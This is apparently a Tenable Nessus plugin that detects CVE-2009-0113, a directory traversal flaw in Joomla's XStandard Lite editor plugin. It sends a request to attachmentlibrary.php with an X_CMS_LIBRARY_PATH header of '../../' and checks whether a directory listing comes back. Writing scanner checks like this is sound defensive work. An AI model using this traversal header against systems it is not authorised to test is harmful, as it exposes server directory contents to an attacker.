#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(35321);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2009-0113");
  script_bugtraq_id(33143);
  script_xref(name:"milw0rm", value:"7691");
  script_xref(name:"OSVDB", value:"51172");
  script_xref(name:"Secunia", value:"33377");

  script_name(english:"XStandard Lite Plugin for Joomla! X_CMS_LIBRARY_PATH Header Directory Traversal");
  script_summary(english:"Tries to list contents of top-level Joomla! directory");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by an
information disclosure vulnerability." );
 script_set_attribute(attribute:"description", value:
"The version of Joomla! installed on the remote host is distributed
with a WYSIWYG editor plugin known as XStandard Lite, and the
'attachmentlibrary.php' script included with that fails to sanitize
input to the 'X_CMS_LIBRARY_PATH' request header of directory
traversal sequences before returning a listing of directories and
certain types of files ('txt', 'zip', 'pdf', 'doc', 'rtf', 'tar',
'ppt', 'xls', 'xml', 'xsl', 'xslt', 'swf', 'gif', 'jpeg', 'jpg',
'png', and 'bmp' by default).  Regardless of whether this plugin has
been configured for use with the remote Joomla installation, an
unauthenticated attacker may be able to leverage this issue to list
the contents of directories on the remote host, subject to the
privileges of the web server user id." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Target directory (relative to Joomla's 'images/stories' directory).
target_dir = "../../";

# Test an install.
install = get_kb_item(string("www/", port, "/joomla"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to exploit the issue to get a list of directories under target_dir.
  url = string(dir, "/plugins/editors/xstandard/attachmentlibrary.php");

  res = http_send_recv3(
    port        : port,
    method      : "GET", 
    item        : url, 
    add_headers : make_array("X_CMS_LIBRARY_PATH", target_dir)
  );   
  if (res == NULL) exit(0);

  # There's a problem if we got a listing that looks like it's from Joomla's main directory.
  if (
    '<library><containers><container><objectName>' >< res[2] &&
    string('<path>', target_dir, '</path>') >< res[2] &&
    (
      '/administrator/</baseURL>' >< res[2] ||
      '/components/</baseURL>' >< res[2]
    )
  )
  {
    if (report_verbosity > 0)
    {
      report = string(
        "\n",
        "Nessus was able to retrieve a listing of the directory\n",
        "'images/stories/", target_dir, "' using following URL :\n",
        "\n",
        "  ", build_url(port:port, qs:url), "\n",
        "\n",
        "along with the following request header :\n",
        "\n",
        "  X_CMS_LIBRARY_PATH: ", target_dir, "\n"
      );

      if (report_verbosity > 1)
      {
        info = res[2];
        info = ereg_replace(pattern:"><(/?library)>", replace:'>\n  <\\1>', string:info);
        info = ereg_replace(pattern:"><(/?containers)>", replace:'>\n  <\\1>', string:info);
        info = ereg_replace(pattern:"><(container)>", replace:'>\n    <\\1>', string:info);
        info = ereg_replace(pattern:"><(/container)>", replace:'>\n    <\\1>', string:info);
        info = ereg_replace(pattern:"><([^>]+)>", replace:'>\n      <\\1>', string:info);

        report = string(
          report,
          "\n",
          "This produced the following (slightly reformatted) output :\n",
          "\n",
          "  ", str_replace(find:'\n', replace:'\n  ', string:info), "\n"
        );
      }
      security_warning(port:port, extra:report);
    }
    else security_warning(port);
  }
}
